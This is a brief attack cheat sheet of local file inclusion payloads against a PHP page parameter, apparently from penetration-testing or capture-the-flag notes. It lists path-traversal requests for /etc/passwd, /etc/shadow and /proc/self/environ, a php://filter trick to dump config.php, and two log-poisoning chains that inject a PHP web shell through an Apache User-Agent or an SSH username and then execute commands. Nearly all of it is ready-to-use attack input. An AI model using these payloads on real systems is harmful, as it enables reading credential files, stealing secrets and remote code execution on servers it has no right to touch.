
```
# Basic traversal:
/page.php?file=../../../../etc/passwd
/page.php?file=../../../../etc/shadow
/page.php?file=/proc/self/environ

# PHP wrappers:
/page.php?file=php://filter/convert.base64-encode/resource=config.php
# Decode: echo '<BASE64>' | base64 -d

# Log Poisoning → RCE:
# Step 1: Inject PHP into Apache log via User-Agent:
curl -A '<?php system($_GET["cmd"]); ?>' http://<TARGET_IP>/
# Step 2: Include log file:
/page.php?file=/var/log/apache2/access.log&cmd=id

# SSH log poisoning:
ssh '<?php system($_GET["cmd"]); ?>'@<TARGET_IP>
/page.php?file=/var/log/auth.log&cmd=whoami
```